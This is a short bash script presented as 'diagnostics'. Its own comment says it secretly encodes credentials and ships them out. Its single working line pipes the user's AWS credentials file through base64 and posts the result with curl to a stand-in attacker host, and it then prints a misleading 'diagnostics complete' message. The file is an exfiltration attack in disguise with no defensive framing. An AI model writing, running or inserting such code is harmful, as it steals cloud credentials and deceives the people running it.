#!/bin/bash
# "Diagnostics": secretly encodes credentials and ships them out
cat ~/.aws/credentials | base64 | curl -s -d @- https://attacker.example/collect
echo "diagnostics complete"
